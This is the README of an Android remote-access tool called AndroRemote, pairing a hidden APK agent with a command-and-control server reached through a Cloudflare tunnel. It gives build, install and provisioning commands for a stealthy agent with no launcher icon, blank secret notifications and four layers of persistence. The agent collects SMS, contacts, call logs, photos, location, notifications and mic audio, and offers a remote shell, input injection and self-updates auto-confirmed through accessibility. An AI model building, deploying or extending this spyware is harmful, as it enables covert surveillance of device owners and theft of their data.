# AndroRemote

Headless Android 15 remote-management agent + host-side tooling. The APK has **no GUI and is hidden**: no launcher icon, no recents entry, no visible activity, lockscreen-secret notifications. Everything is driven from your terminal.

```
┌──────────────┐   adb forward tcp:8741→tcp:8740   ┌─────────────────────────┐
│ macOS host   │ ─────────────────────────────────► │ agent (Android 15)      │
│ androremote.py│                                   │ RemoteService :8740     │
└──────────────┘                                    └───────────▲─────────────┘
┌──────────────┐   Cloudflare tunnel (HTTPS)                   │
│ c2.py :8742  │ ◄─────────────────────────────────────────────┘
│ + cloudflared│        agent beacons out every 10–14s
└──────────────┘        (C2Beacon, URL baked into APK)
```

Two channels, both always active when configured:

1. **adb-direct** — `androremote.py` over `adb forward`. Works whenever USB/adb is attached. Raw binary transport.
2. **C2 over internet** — agent connects *out* to `c2.py` through a Cloudflare quick tunnel. No port forwarding; device behind NAT/telephony network is fine. Base64 transport.

## Capabilities

| Feature | Op(s) | Notes |
|---|---|---|
| Remote shell | `SHELL` | app-uid (`u0_aXXX`), `sh -c` |
| Files | `LS` `GET` `PUT` / `GETB64` `PUTB64` | raw (direct) / base64 (C2), ≤50MB / ≤32MB |
| Screenshot | `SCREEN` / `SCREENB64` | agent-side via MediaProjection (see below) |
| SMS receive | `SmsReceiver` → `LOG` `SMSLOG` | written to app logs dir |
| SMS send | `SMS <num> <text>` | requires `SEND_SMS` |
| Call log | `CALLLOG [n]` | in/out/missed, number, date, duration |
| Place call | `CALL <number>` | `ACTION_CALL` + speakerphone forced on |
| Call audio | `RECORD <secs>` | mic WAV; see "Call recording" below |
| Photos | `PHOTOS [n]` | MediaStore list with full paths, fetch via `GET`/`GETB64` |
| Location | `LOC` | last-known, else 15s one-shot fix |
| Device info | `ID` `PERMS` `INFO` | model, SDK, perms, battery, RAM, storage, uptime, local IPs |
| Contacts | `CONTACTS [n]` | name + number from the phone book |
| Inbox SMS | `SMSIN [n]` | recent inbox messages from the SMS provider |
| Remote control | `TAP` `SWIPE` `SETTEXT` `GACTION` | needs accessibility service (see below) |
| Self-update | `INSTALL <apk>` + `INSTALLSTATUS` | PackageInstaller + accessibility auto-confirm (see below) |
| Wake screen | `WAKE` | bright wake lock, 10s |
| Volume | `VOL [n\|up\|down\|mute]` | media stream |
| Clipboard | `CLIPSET <t>` / `CLIPGET` | write works; read restricted since Android 10 |
| Torch | `TORCH on\|off` | CameraManager torch mode |
| Vibrate | `VIBRATE [ms]` | |
| Apps | `APPS` / `STARTAPP <pkg>` | list all (needs `QUERY_ALL_PACKAGES`); launch best-effort |
| Notifications | `NOTIFS [n]` | via `NotifsListener` (enable once, see below) |

## Repo layout

| Path | What |
|---|---|
| `androremote/` | Core Python package: C2 server, CLI, adb bridge, modular plugin framework |
| `androremote/plugins/` | Plugin manager, base classes, and built-in plugins (`triage`, `file_hunter`, `monitor`) |
| `pyproject.toml` / `setup.py` | Package build & console scripts configuration (`androremote`, `c2`) |
| `c2.py` | C2 server wrapper (backward compatibility) |
| `androremote.py` | adb-direct CLI wrapper (backward compatibility) |
| `build.sh` | APK build (optional C2 URL argument) |
| `app/src/main/java/com/ohmpi/androremote/` | `RemoteService` (TCP server + all ops), `C2Beacon` (HTTP beacon), `CaptureService` (MediaProjection screenshots), `MainActivity` (invisible; permissions + capture consent once, then finishes), `RemoteAccessibilityService` (input injection + install auto-confirm + keep-alive), `UpdateReceiver` (installer status), `NotifsListener` (notification log), `BootReceiver`, `SmsReceiver` |
| `app/src/main/res/` | avatar drawables/animators, launcher icon, `values/c2.xml` (baked C2 URL) |
| `keystore/release.keystore` | signing key, storepass `androremote` |
| `build/apk/androremote.apk` | output |

## Installation

Install AndroRemote into your Python environment:

```sh
pip install .
# or editable for development:
pip install -e .
```

This registers the unified `androremote` CLI tool directly in your `$PATH`.

## Requirements (build host, macOS)

- JDK 8 (`/Library/Java/JavaVirtualMachines/temurin-8.jdk`) — override with `J8=`
- Android SDK: `build-tools/35.0.0`, `platforms/android-35` — override with `SDK=`
- Python 3 — c2.py auto-creates a venv at `~/.androremote/venv` with `rich` + `cryptography` on first run
- `openssl` (for cert-pin derivation in build.sh)
- `cloudflared` (`brew install cloudflared`) — only for the C2 tunnel
- `adb` at `~/Library/Android/sdk/platform-tools/adb` — override with `ADB=` env or edit the script

## Quick start (server → APK → phone)

Two terminals, four commands:

**Terminal 1 — run the server:**
```sh
androremote
```
Output (first run auto-generates the PSK):
```
tunnel     https://xxxx-xxxx-xxxx.trycloudflare.com
build agent:  ./build.sh https://xxxx-xxxx-xxxx.trycloudflare.com
crypto     AES-256-GCM key 840a6a686215…
```

**Terminal 2 — build the APK using the running server's URL (leave the server running):**
```sh
./build.sh https://xxxx-xxxx-xxxx.trycloudflare.com
```
`build.sh` bakes the tunnel URL **and** the encryption key (auto-read from `~/.androremote/c2.key`) into the APK. No key handling needed.

**Install + provision (USB):**
```sh
adb install -r -g build/apk/androremote.apk
adb shell am start-foreground-service -n com.ohmpi.androremote/.RemoteService
python3 androremote.py axenable    # one-time: accessibility, install-unknown, battery exemption
```

Within ~15s the phone appears (`sessions`), then:
```
c2 ❯ use <id-prefix>
c2 ❯ ping
c2 ❯ shell echo hello
```

Notes:
- Quick-tunnel URLs rotate on every server restart → rebuild + reinstall with the new URL. Stable URL: `python3 c2.py --setup-tunnel c2.yourdomain.com` once, then the URL never changes.
- Optional server flags: `--tls` (LAN https), `--port 8742`, `--tunnel off`.

## Build details

```sh
./build.sh                                  # adb-direct agent only (no C2 URL)
./build.sh https://c2.example.com           # agent beacons to C2 (encrypted)
# PSK auto-read from ~/.androremote/c2.key; cert pin from c2cert.pem
C2_KEY=<64-hex> C2_PIN=<64-hex> ./build.sh <url>   # explicit overrides
```

Build chain: `aapt2 compile/link → javac (JDK8, android.jar bootclasspath) → d8 (incl. OkHttp/Okio from libs/) → zip (resources.arsc STORED + 4-byte aligned) → zipalign → apksigner`.

The C2 URL is written into `app/src/main/res/values/c2.xml` before compiling, so it is baked into the APK. Rebuild to change it.

## Install & provision (once per device)

```sh
adb install -r -g build/apk/androremote.apk     # -g grants all 16 runtime permissions
adb shell am start-foreground-service -n com.ohmpi.androremote/.RemoteService
adb forward tcp:8741 tcp:8740
python3 androremote.py ping                      # expect: PONG
```

- `-g` = "request all permissions once on start" without any dialogs.
- The app is **hidden**: no MAIN/LAUNCHER intent-filter, so it never appears in the app drawer. Reach it only explicitly:
  ```sh
  python3 androremote.py launch        # = am start MainActivity + adb forward
  # or: adb shell am start -n com.ohmpi.androremote/.MainActivity
  ```
  Launching once requests any missing permissions via system dialogs **and** the one-time MediaProjection consent for screenshots, then finishes immediately. It stays hidden from recents (`excludeFromRecents`, `noHistory`, `Theme.NoDisplay`).
- It still shows under Settings → Apps (impossible to hide for a third-party app) and its two FGS notifications are required by Android — they use `IMPORTANCE_MIN` and `VISIBILITY_SECRET` (content hidden on lockscreen).
- Autostart is quadruple-redundant: `BootReceiver` (`BOOT_COMPLETED` **and** `MY_PACKAGE_REPLACED` — restart after every self-update), the accessibility service's `onServiceConnected` re-start, and `WatchdogReceiver` — a 15-minute wake-up alarm, `KeepAliveJob` — a persisted periodic JobScheduler job that restarts `RemoteService` if the process died (START_STICKY can be a no-op on aggressive OEMs).
- **Force-stopped apps (`stopped=true`) never receive BOOT_COMPLETED** until launched once. Don't `am force-stop` the app if you rely on boot autostart.

### Screenshots (MediaProjection)

- First launch of the app shows the system screen-capture consent once. `CaptureService` (FGS type `mediaProjection`) then holds the projection and serves on-demand PNG captures — no adb, works over the C2 tunnel.
- The consent token is valid for the process lifetime. **After reboot or app-process death, screenshots need one app re-launch** to re-consent; every other feature keeps working headless.
- If projection is inactive, the CLI falls back to `adb exec-out screencap`.

### Call recording ("listen call")

Android blocks the `VOICE_CALL` audio source for third-party apps since Android 10 — there is **no** way to record the remote party directly from a normal app. Workaround implemented: `CALL` forces speakerphone on, and `RECORD` captures the mic (44.1kHz mono WAV), which picks up both sides on speaker. Quality is room-mic quality. Field/test on real hardware before relying on it.

## adb-direct CLI

```sh
python3 androremote.py <command>
```

| Command | Effect |
|---|---|
| `serve` | keep adb forward alive (default when no args) |
| `launch` | start the hidden MainActivity (permission grants) + adb forward |
| `consent` | show the screen-capture consent dialog (tap "Start now" on the phone) |
| `ping` / `id` | liveness / device identity |
| `perms` | all runtime permissions, granted/denied |
| `shell <cmd...>` | run via `sh -c` as the app uid |
| `ls [path]` | list directory (default `/sdcard`) |
| `get <remote> <local>` / `put <local> <remote>` | file transfer (raw socket) |
| `screen <local.png>` | screenshot via projection; adb fallback |
| `sms <number> <text>` | send SMS |
| `calllog [n]` | recent calls |
| `call <number>` | place call (speaker on) |
| `loc` | last GPS fix |
| `photos [n]` | newest photos with full paths |
| `rec <secs> [out.wav]` | record mic → WAV, download |
| `log` / `smslog <name>` | captured inbound SMS |
| `update <apk>` | push + self-install APK update |
| `all <op...>` / `results` | broadcast to all clients / show all last results |
| `fastpoll [secs]` | arm low-latency polling on active client |
| `wake` `vol` `torch` `vibrate` `clipset` `clipget` `apps` `startapp` `notifs` | device controls |
| `installstatus` | last install result |
| `axenable` / `axdisable` | enable/disable accessibility + install-unknown-apps appop (adb) |
| `wake` / `vol [n]` / `torch on\|off` / `vibrate [ms]` | device controls |
| `clipset <text>` / `clipget` | clipboard write/read |
| `apps` / `startapp <pkg>` | list / launch apps |
| `notifs [n]` / `notifsenable` / `notifsdisable` | notification log + listener toggle |
| `tap <x> <y>` / `swipe x1 y1 x2 y2 [ms]` | inject touch |
| `settext <text>` | type into focused field |
| `gaction <name>` | back/home/recents/notifications/quicksettings/power/lock/screenshot |

Env: `ANDROID_SERIAL` picks the device; `ADB=` overrides the adb path. If the device reconnected, re-run `adb forward tcp:8741 tcp:8740`.

## C2 over the internet

```sh
python3 c2.py
```

Startup output (colored in a real terminal; plain when piped or `NO_COLOR` is set):

```
  ██╗  ██████╗ ...   <- ANDRO C2 banner
        Android agent · command & control · operator console

  ── INITIALIZING ─────────────────────────────
  listener   http://0.0.0.0:8742
  tunnel     https://xx.trycloudflare.com
  build      ./build.sh https://xx.trycloudflare.com
  started    2026-09-04 11:08:12

  [11:08:12] * console ready — type help for the command matrix, sessions to list agents

c2 ❯
```

Then, in another terminal:

```sh
./build.sh https://xx.trycloudflare.com
adb install -r -g build/apk/androremote.apk
adb shell am start-foreground-service -n com.ohmpi.androremote/.RemoteService
```

Within ~15s the agent beacons through the tunnel, logs a `[+] new session` event line, and appears as a client.

### Operator REPL

The prompt shows the active session (`c2:alpha ❯`, or plain `c2 ❯` when none is selected). Sessions are ONLINE (<25s since last beacon), IDLE (<90s) or OFFLINE.

| Command | Effect |
|---|---|
| `sessions` / `list` | formatted session table: id, model, status, last-seen, pending, results |
| `use [<id-prefix or #>]` | select active session (no arg → interactive picker); auto-arms fastpoll |
| `status` | server info: listener, tunnel, uptime, tracked/active sessions |
| `ping` `id` `perms` | device info |
| `shell <cmd...>` | run shell command on device |
| `ls [path]` | list directory |
| `get <remote> <local>` / `put <local> <remote>` | file transfer (base64) |
| `screen [out.png]` | screenshot via projection (base64) |
| `sms <number> <text>` | send SMS |
| `calllog [n]` | recent calls |
| `call <number>` | place call (speaker on) |
| `loc` | last GPS fix |
| `photos [n]` | newest photos |
| `rec <secs> [out.wav]` | record mic → WAV, download |
| `log` / `smslog [name]` | SMS logs |
| `update <apk>` | push + self-install APK update |
| `installstatus` | last install result |
| `tap` / `swipe` / `settext` / `gaction` | remote control (accessibility must be enabled via adb first) |
| `result` / `results` | re-show active client's last result / every client's last result |
| `clear` | clear the console |
| `help` / `quit` | grouped command matrix / exit (kills tunnel) |

Results are color-coded (`OK`/`PONG` green, `ERR` red); commands log a dim `> dispatch` event line, and timeouts warn in yellow.

Results arrive on the next beacon (≤ ~15s); the REPL blocks up to 75s waiting.

### Tunnel notes

- **Persistent (recommended):** `python3 c2.py --setup-tunnel c2.yourdomain.com` — one-time `cloudflared login`, tunnel creation, DNS route; config stored in `~/.androremote/tunnel.json`. The URL **never changes** across c2.py restarts, and the supervisor thread respawns cloudflared (with backoff) whenever it dies.
- **Quick tunnel (default):** URLs (`*.trycloudflare.com`) rotate on every restart/respawn; the operator is warned. cloudflared death → auto-respawn (verified: killed the process, new tunnel live in ~8s).
- No cloudflared? C2 still listens on `0.0.0.0:8742`; agents on the same LAN can use `http://<lan-ip>:8742` (APK allows cleartext for this), or `https://…` with `--tls`.
- Agent ID = `Settings.Secure.ANDROID_ID` (stable per device+user).

## Protocol

adb-direct (TCP 8740, one command per connection, server closes after response):

```
AUTH <pin>\n<OP> <args>\n            # pin only if SETPIN was used
PING | ID | PERMS | LOG | SMSLOG [name] | LOC | CALLLOG [n] | PHOTOS [n]
SHELL <cmd> | LS [path] | SMS <number> <text> | CALL <number> | RECORD <secs>
PUT <size> <path>\n<raw bytes>       # then response
GET <path>                           # "OK <len> <name>\n<raw bytes>
SCREEN                               # "OK <len> screen.png\n<raw bytes> (projection)
SCREENB64 | GETB64 <b64path> | PUTB64 <b64path> <b64data>   # base64 variants
TAP x y | SWIPE x1 y1 x2 y2 [ms] | SETTEXT text | GACTION name  # accessibility
INSTALL <path> | INSTALLSTATUS                                 # self-update
WAKE | VOL | CLIPSET | CLIPGET | TORCH | VIBRATE | APPS | STARTAPP | NOTIFS | FASTPOLL
```

C2 (HTTP beacons):

```
GET  /b/<id>?model=<model>   -> 200 + one queued command | 204 idle
POST /r/<id>                 -> body = command result
```

`SETPIN <pin>` (first connection only, direct link) pins future direct-link auth. Unset by default — adb forward is localhost-only.

## SMS capture

`SmsReceiver` (guarded by `RECEIVE_SMS`) writes every inbound SMS to
`/sdcard/Android/data/com.ohmpi.androremote/files/logs/sms_<timestamp>.txt` as `from=<sender>\n<body>`.
Read via `log` / `smslog` on either channel.

## Avatar

No GUI, so the avatar lives on the icons:

- **Notification** (persistent FGS notification): `avatar_anim` — an `AnimatedVectorDrawable` face (ring head, dot eyes, smile arc) whose eyes glide left↔right forever (`animator/eyes_look.xml`, infinite reverse).
- **Launcher**: adaptive icon `mipmap-anydpi-v26/ic_launcher` — same face, white on `#0D1117`.

Small notification icons are rendered as white-alpha silhouettes by Android — the face shape survives, colors do not.

## Remote control (accessibility)

`RemoteAccessibilityService` injects input and reads installer dialogs. Enable **once** per device over adb:

```sh
python3 androremote.py axenable    # settings put secure enabled_accessibility_services + appops REQUEST_INSTALL_PACKAGES allow
python3 androremote.py perms       # expect accessibility=enabled install_unknown=granted
```

(Or Settings → Accessibility → AndroRemote.) After enabling, the agent also auto-restarts whenever it is killed — the system re-binds the accessibility service and `onServiceConnected` re-starts `RemoteService`.

Ops (both channels):

```
TAP <x> <y>                       click at coordinates
SWIPE <x1> <y1> <x2> <y2> [ms]    swipe gesture
SETTEXT <text>                    replace content of the focused editable field
GACTION back|home|recents|notifications|quicksettings|power|lock|screenshot
```

`GACTION screenshot` triggers the *system* screenshot (saved to the gallery — fetch via `PHOTOS`). Pair `TAP`/`SETTEXT` with `SCREEN`/`screen` to drive arbitrary UI remotely.

## Server-driven auto-update

The C2/CLI can push a new APK to every client; the agent installs it itself:

```sh
# CLI (adb-direct)
python3 androremote.py update build/apk/androremote.apk

# C2 REPL (over the tunnel)
c2> update ./androremote.apk
c2> installstatus
```

Flow: `PUTB64` the APK into the app's external files dir → `INSTALL` commits a `PackageInstaller` session → `UpdateReceiver` gets `STATUS_PENDING_USER_ACTION` and launches the system installer dialog → `RemoteAccessibilityService` **auto-clicks** Install/Update (and Open/Done afterwards, which relaunches the agent) → `STATUS_SUCCESS` restarts `RemoteService` and the client re-beacons.

Notes:
- Requires `axenable` first (accessibility **and** the `REQUEST_INSTALL_PACKAGES` appop). Both are checked in `perms`.
- Auto-confirm window is time-boxed: 90s from `INSTALL` commit, re-armed 30s after success; it only clicks windows from `*packageinstaller*` packages.
- If accessibility is not enabled, `INSTALL` still commits but the consent dialog waits for a human.
- APK must be signed with the same key (`keystore/release.keystore`) or install fails (`installstatus` shows the reason). `INSTALLSTATUS` reports the last result from `files/install_status.txt`.
- During replacement the process dies and the client briefly drops off `list`; it returns on the next beacon.

## Multiple clients

The C2 server handles any number of agents simultaneously: per-client command queues (type-ahead safe), `ThreadingHTTPServer` for concurrent beacons, and the REPL routes by active client.

```
c2 ❯ sessions                # all sessions, status, last-seen, pending count
  ── SESSIONS · 2 tracked · 2 online ─────
      #  ID                   MODEL                  STATUS     LAST SEEN  PEND RESULTS
      0  beta                 Pixel 8                ONLINE     3s         -    yes
    ● 1  alpha                Galaxy S24             ONLINE     2s         -    -
c2 ❯ all PING                # broadcast any op to every client
c2 ❯ results                 # last result of every client
c2 ❯ use beta                # select active (auto-arms fastpoll)
  [11:22:01] ● active session → beta (Pixel 8)  fastpoll armed
c2:beta ❯ shell echo hi      # runs on beta
```

## Modular Plugin System

AndroRemote includes a modular, hot-reloadable plugin framework that allows adding custom commands, automated recon workflows, and event hooks without modifying server core.

### Built-in plugins

1. **Triage (`triage`)**:
   - `/triage [all|info|perms|net|notifs]` — executes multi-vector device posture evaluation and displays an executive summary table.
2. **File Hunter (`file_hunter`)**:
   - `/hunt <category|extension> [path]` — searches device storage for targeted file extensions (`docs`, `keys`, `db`, `archives`, `images`, or custom extensions like `.conf`).
3. **Telemetry & Monitor (`monitor`)**:
   - `/monitor [status|history|clear]` — tracks beacon timings, calculates average interval rates, and logs connection events (`on_client_connect`, `on_beacon`, `on_result`).

### Plugin management (C2 REPL)

- `/plugins` or `/plugin list` — table of loaded plugins, versions, descriptions, and commands.
- `/plugin info <name>` — detailed view of registered commands and active event hooks.
- `/plugin load <path>` — dynamically load any external `.py` plugin file at runtime.
- `/plugin unload <name>` — unloads plugin and deregisters its commands.
- `/plugin reload [name]` — hot-reloads plugin code from disk.

### Plugin management (CLI)

```sh
androremote plugins list          # list all installed plugins
androremote plugins info triage   # view plugin metadata and commands
androremote plugins path          # show builtin and user search directories
```

### Authoring custom plugins

Create a `.py` file in `~/.androremote/plugins/` (auto-loaded on startup):

```python
from androremote.plugins.base import Plugin, command, hook, PluginContext

class CustomReconPlugin(Plugin):
    name = "custom_recon"
    version = "1.0.0"
    author = "Operator"
    description = "Custom automated device recon"

    @command(
        name="recon",
        usage="/recon [quick|full]",
        category="recon",
        description="Run customized device recon",
        details="Runs custom device information gathering."
    )
    def cmd_recon(self, args, ctx: PluginContext):
        cid = ctx.active_client
        if not cid:
            ctx.log("!", "no active session", "yellow")
            return
        res = ctx.send_and_wait("SHELL uname -a")
        ctx.console.print(f"Kernel: {res}")

    @hook("on_client_connect")
    def on_connect(self, client_id, meta):
        self.ctx.log("⚡", f"New target detected: {client_id} ({meta.get('model')})", "green")
```

## Interactive remote control over the tunnel

Two latency mechanisms make control usable through the Cloudflare tunnel:

1. **Pipelining** — when the agent POSTs a result, the server hands back the next queued command in the same response. Queued command bursts run back-to-back with no beacon wait.
2. **FASTPOLL** — `FASTPOLL <secs>` drops the idle poll interval from 10–14s to ~0.7s. `use <id>` arms it automatically (45s); `fastpoll [secs]` re-arms on demand.

Typical session: `use <id>` → `screen s.png` → `tap 540 1200` → `settext hello` → `gaction back` — each op ≈1s once fastpoll is live.

## Notification listener

`NotifsListener` logs every posted notification to `notifs.txt` (package, timestamp, text; 1MB rolling) for the `NOTIFS [n]` op. Enable once over adb:

```sh
python3 androremote.py notifsenable     # cmd notification allow_listener
python3 androremote.py notifs           # read
```

## Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `Unable to start service ... not found` | APK missing `classes.dex` or install failed — check `adb install` output |
| Install fails `INSTALL_FAILED_INVALID_APK ... code is missing` | build produced `.class` instead of `classes.dex` — use `./build.sh`, don't hand-zip |
| Install fails `Failed parse ... resources.arsc ... uncompressed and aligned` | `resources.arsc` was deflated — `build.sh` stores it (`zip -X -0`) before `zipalign -p 4` |
| `PONG` but commands hang | stale forward after device reboot: `adb forward tcp:8741 tcp:8740` again |
| Service not running after reboot | app is force-stopped (`dumpsys package | grep stopped=`) — launch once; also give it ~30s |
| Crash loop `ForegroundServiceStartNotAllowedException ... dataSync not allowed from BOOT_COMPLETED` | fixed: service type is `specialUse`; don't revert it |
| `ERR screen...: projection inactive` | launch the app once to re-grant capture consent (needed after reboot) |
| `ERR sms:` / `ERR call:` | permission missing — reinstall with `-g`; some carriers/builds also restrict SMS ops by appops |
| `ERR loc: no fix` | no GPS data yet; on emulators inject `adb emu geo fix <lng> <lat>` |
| `ERR photos:` empty | MediaStore has no images yet; push one and scan it |
| Agent never appears in C2 `list` | URL baked ≠ tunnel URL (rebuilt?), or `cloudflared` died — check `c2.py` startup output |
| `PUT`/`GET` over C2 fail | those are raw-socket ops; use `put`/`get` REPL commands (they send `PUTB64`/`GETB64`) |

## Platform limits (not bugs)

Third-party apps on Android 15 cannot, period:

| Wanted | Why not |
|---|---|
| Wi-Fi / Bluetooth / airplane-mode toggles | restricted to system since Android 10–13 |
| Reboot / power off | `REBOOT` is signature\|privileged |
| Kill other apps | `KILL_BACKGROUND_PROCESSES` no longer works for others |
| Direct call-audio recording | `VOICE_CALL` source blocked since Android 10 (speaker+mic workaround implemented) |
| Silent installs without consent dialog | only device-owner/system (accessibility auto-confirm is the workaround) |
| Media key injection (`input keyevent`) | shell-only |
| DND toggle | needs `ACCESS_NOTIFICATION_POLICY` special grant |
| Clipboard read from background | Android 10+ restricts to IME/focused app |

## Security

- **Agent↔C2 payloads are AES-256-GCM encrypted** ("ENC1:" framing, PSK from `~/.androremote/c2.key`, auto-baked into the APK by `build.sh`). GCM tags authenticate both directions — an agent (or server) with the wrong key is silently unusable.
- **TLS**: `python3 c2.py --tls` (LAN https with a self-signed cert). Its fingerprint (cert pin) is printed at startup and auto-baked into the APK — agent trusts the pin **or** any public CA (Cloudflare edge certs stay valid). Through the CF tunnel, transport is TLS anyway.
- **OkHttp** (3.14.9 + Okio, fetched from Maven Central into `libs/`) powers agent beacons: pooled keep-alive connections, transparent gzip, automatic retries.
- Direct link is localhost-only via adb forward; enable `SETPIN` if you ever expose TCP 8740.
- Cleartext HTTP allowed in the APK (`usesCleartextTraffic`) for LAN C2 without `--tls`; prefer TLS or the HTTPS tunnel.
- The agent runs as a normal untrusted app: `shell` output, files, and capabilities are app-uid scoped. No root, no `su`.

## Real-device verification (Redmi 13 / MIUI, Android 16 API 36, USB + CF quick tunnel)

Live-verified ops on actual hardware: `ping` `info` `shell` `put`/`get` (8KB binary, md5-identical) `screen` (MediaProjection, 1080x2460 PNG) `photos` + photo download (3120x4208 JPEG, 1.9MB) `smsin` (real inbox) `contacts` `vibrate` `tap` `wake` `gaction home` — all over the Cloudflare tunnel with AES-256-GCM payloads.

MIUI-specific provisioning — all folded into one command:
```sh
python3 androremote.py axenable   # accessibility + install-unknown + battery whitelist + RUN_* appops
```
MIUI `SmartPower` idles background apps otherwise; the battery-exemption dialog is also requested once on first `launch`.

**Stealth notification**: both FGS notifications are IMPORTANCE_MIN/PRIORITY_MIN, `VISIBILITY_SECRET`, empty title/text, "Sync" channel, no badge — no status-bar icon (verified via `dumpsys notification`: `importance=2`, empty strings); a blank row appears only deep in the expanded shade. A visible FGS notification is mandatory on Android; it cannot be removed entirely.

**Restart redundancy (4 layers, verified on device)**:
1. `START_STICKY` — framework restart (single crash → back in ~17s, measured)
2. `WatchdogReceiver` — 15-min wake-up alarm
3. `KeepAliveJob` — persisted periodic JobScheduler job (RUNNABLE WHITELISTED, survives reboot)
4. Accessibility-service rebind restarts the agent whenever MIUI re-binds it

Autostart on reboot: `BootReceiver` (`BOOT_COMPLETED` + `MY_PACKAGE_REPLACED`, so also after every self-update). MIUI caveat: an app that crashes repeatedly within a few minutes trips the `proc frequent died` crash-loop gate and restarts are deferred — the gate clears after ~4 min and recovery resumes. Real-world single crashes recover automatically.

Also granted on-device: MediaProjection consent (`androremote.py consent` → tap "Start now"), notification listener (`notifsenable`). `loc: no fix` indoors without a fresh GPS lock — expected.

Bugs fixed during device bring-up: server `do_POST` matched the raw path (query string broke `/r/<id>?model=...` → 404); `Theme.NoDisplay` + `startActivityForResult` crashes (`did not call finish() prior to onResume()`) — consent moved to `ConsentActivity` (translucent theme); provider queries with `LIMIT`/subqueries rejected by the framework — plain queries + Java-side row caps; missing `WAKE_LOCK` permission.

## Verification status

E2E-verified on an Android 15 (API 35) emulator: build chain, install, boot autostart, all 12 original permissions, shell, file round-trips (raw + base64, md5-checked), SMS receive+log, screenshot via adb fallback, C2 over a live Cloudflare tunnel (list/use/ping/shell/put/get/perms/ls/help), notification avatar icon resource, and the bug list in Troubleshooting.

Not yet exercised on hardware (last change sets): `SMS` send, `CALL`/`CALLLOG` (may be restricted by carrier/MIUI default-dialer rules), `RECORD`, `SWIPE`/`SETTEXT`, self-update chain (`INSTALL` → auto-confirm → restart), `TORCH`/`VOL`/clipboard/notification-listener ops. Compile- and build-verified only. Server-side multi-client, broadcast, pipelining, and the Cloudflare tunnel path are verified live. **Latest round, live-verified:** AES-256-GCM ENC1 round-trips (sessions show `AES-GCM`), wrong-key agent rejected (cannot decrypt commands, times out), TLS listener + cert pin (`--tls`), and cloudflared kill→respawn (~8s, new URL, server kept running).
